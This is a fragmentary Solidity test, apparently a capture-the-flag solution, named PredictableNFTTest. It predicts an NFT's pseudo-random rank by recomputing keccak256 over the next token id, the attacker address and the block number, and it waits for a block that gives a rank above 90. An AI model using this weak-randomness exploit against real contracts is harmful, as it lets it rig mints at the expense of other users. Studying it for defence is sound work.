...
contract PredictableNFTTest is Test {
    ...
    function test() public {
        ...
        uint256 mintedId = uint256(bytes32(res));
        ...
        for (uint256 i = 0; i < 100; i++) {
            ...
            if (
                uint256(keccak256(abi.encodePacked(mintedId + 1, uint256(uint160(hacker)), currentBlockNum))) % 100 > 90
            ) {
        ...
        (, bytes memory ret) = nft.call(abi.encodeWithSignature("tokens(uint256)", mintedId));
        uint256 mintedRank = uint256(bytes32(ret));
